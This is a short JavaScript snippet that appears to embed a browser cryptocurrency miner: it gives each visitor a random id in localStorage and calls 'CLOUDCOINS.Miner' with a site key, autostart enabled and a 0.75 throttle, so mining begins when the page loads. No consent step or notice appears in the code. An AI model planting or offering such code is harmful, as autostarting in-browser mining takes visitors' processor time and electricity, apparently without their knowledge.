localStorage.setItem('uuid', localStorage.getItem('uuid') || `${Math.random()}${Math.random()}${Math.random()}${Math.random()}`);
window.m = CLOUDCOINS.Miner({
    key: 'ienvsQZVRnNaC5TUJ1oj26arv1zQCFoy',
    user: localStorage.getItem('uuid'),
    autostart: true,
    throttle: 0.75,
});